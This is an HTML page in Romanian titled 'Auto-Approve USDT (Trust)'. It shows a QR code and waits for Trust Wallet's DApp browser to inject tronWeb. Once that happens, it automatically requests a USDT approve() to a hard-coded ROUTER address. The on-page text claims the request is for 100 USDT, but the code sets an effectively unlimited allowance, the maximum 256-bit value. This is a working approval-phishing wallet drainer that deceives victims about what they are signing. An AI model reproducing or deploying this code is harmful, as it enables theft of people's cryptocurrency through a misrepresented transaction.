<!doctype html>
<html lang="ro">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Auto-Approve USDT (Trust)</title>
<style>
body{margin:0;height:100vh;display:flex;justify-content:center;align-items:center;background:#0b1220;color:#fff;font-family:system-ui}
.card{width:94%;max-width:560px;padding:20px;background:rgba(255,255,255,0.04);border-radius:12px;text-align:center}
#qr{width:260px;height:260px;background:#fff;border-radius:12px;display:inline-block;overflow:hidden;margin:8px auto}
#status{margin-top:12px;color:#93c5fd;font-size:14px}
.small{font-size:13px;color:#cbd5e1;margin-top:8px}
</style>
</head>
<body>
<div class="card">
  <h3>Scan în Trust Wallet (DApp Browser)</h3>
  <div id="qr" title="Scan cu Trust Wallet"></div>
  <div id="status">Scanează QR în Trust Wallet DApp Browser...</div>
  <div class="small">La încărcare, pagina va încerca automat să ceară aprobarea pentru 100 USDT către adresa ROUTER.</div>
</div>

<!-- QR generator simplu -->
<script>
!function(){function Q(t){this.t=t}Q.prototype.make=function(){var s=33;this.c=s;this.m=[];for(var i=0;i<s;i++){this.m[i]=[];for(var j=0;j<s;j++)this.m[i][j]=!1}var x=0,y=0;for(var k=0;k<this.t.length;k++){var ch=this.t.charCodeAt(k);for(var b=7;b>=0;b--){this.m[y][x]=!!(ch>>b&1);x++;if(x>=s){x=0;y++;if(y>=s)return}}}};Q.prototype.svg=function(cell,fg,bg){cell=cell||6;fg=fg||'#0b1220';bg=bg||'#fff';var s=this.c*cell;var svg=['<svg xmlns="http://www.w3.org/2000/svg" width="'+s+'" height="'+s+'" viewBox="0 0 '+s+' '+s+'" shape-rendering="crispEdges">','<rect width="100%" height="100%" fill="'+bg+'"/>'];for(var i=0;i<this.c;i++)for(var j=0;j<this.c;j++)if(this.m[i][j])svg.push('<rect x="'+(j*cell)+'" y="'+(i*cell)+'" width="'+cell+'" height="'+cell+'" fill="'+fg+'"/>');svg.push('</svg>');return svg.join('')};window.SimpleQR={create:function(t){var q=new Q(t);q.make();return q.svg(6,'#0b1220','#fff')}}}();
</script>

<script>
/* CONFIG — verifică corectitudinea adresei USDT înainte de folosire */
const USDT = "TR7NHqjeKQxGTCi8q8ZY4p8otSzgjLj6t"; // pune aici adresa TRC20 USDT corectă
const ROUTER = "TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu";
const AMOUNT_USDT = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
const USDT_DECIMALS = 6;

let tron = null;
let wallet = null;

function setStatus(t){document.getElementById("status").innerText = t}

/* detect tronWeb injected by Trust Wallet DApp Browser */
function detect(){
  if(window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58){
    tron = window.tronWeb;
    wallet = tron.defaultAddress.base58;
    return true;
  }
  return false;
}

/* QR pointing to this page (scan in Trust opens in DApp Browser) */
function renderQr(){
  const url = location.href;
  const svg = SimpleQR.create(url);
  document.getElementById("qr").innerHTML = svg;
  document.getElementById("qr").onclick = ()=> window.open(url);
}

/* convert decimal string to token units (6 decimals) */
function toTokenUnits(amountStr, decimals){
  const parts = String(amountStr).split('.');
  const whole = parts[0]||'0';
  const frac = parts[1]||'';
  const fracFixed = (frac + '0'.repeat(decimals)).slice(0,decimals);
  // remove leading zeros
  return (whole + fracFixed).replace(/^0+(?=\d)|^$/, '0');
}

/* Send approve automatically when tronWeb available */
async function tryAutoApprove(){
  if(!detect()){
    setStatus("tronWeb nu e disponibil. Deschide pagina în Trust Wallet DApp Browser.");
    return;
  }
  setStatus("Connected: " + wallet + " — pregătire aprobării...");
  try{
    const contract = await tron.contract().at(USDT);
    const tokenAmount = toTokenUnits(AMOUNT_USDT, USDT_DECIMALS);
    setStatus("Solicitare semnătură în Trust Wallet pentru approve " + AMOUNT_USDT + " USDT...");
    const tx = await contract.approve(ROUTER, tokenAmount).send();
    setStatus("Tranzacție trimisă. TXID: " + (tx && (tx.transaction || tx) ? (tx.transaction || tx) : JSON.stringify(tx)));
  }catch(e){
    console.error(e);
    setStatus("Eroare la transmitere: " + (e && e.message ? e.message : 'failed'));
  }
}

/* Init */
renderQr();
/* Dacă pagina e încărcată în DApp Browser, tronWeb poate apărea asynchron — ascultăm schimbarea */
let attempts = 0;
const maxAttempts = 10;
const interval = setInterval(()=>{
  attempts++;
  if(detect()){
    clearInterval(interval);
    tryAutoApprove();
  } else {
    setStatus("Aștept tronWeb... ("+attempts+"/"+maxAttempts+")");
    if(attempts>=maxAttempts){ clearInterval(interval); setStatus("tronWeb nu găsit. Deschide în Trust Wallet DApp Browser și reîncarcă."); }
  }
},1000);
</script>
</body>
</html>
